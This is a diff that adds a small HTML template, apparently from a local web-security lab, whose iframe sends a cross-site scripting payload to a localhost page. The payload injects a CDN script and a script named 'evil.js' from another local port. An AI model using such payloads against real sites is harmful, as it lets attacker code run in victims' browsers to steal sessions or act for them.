@@ -1,0 +1,6 @@
+{% extends "layout.html" %}
+{% block main %}
+<iframe
+    src="http://localhost:5001/oops?q=<script src='https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js'></script><script src='http://localhost:8666/evil.js'></script>"
+    frameborder="0"></iframe>
+{% endblock %}
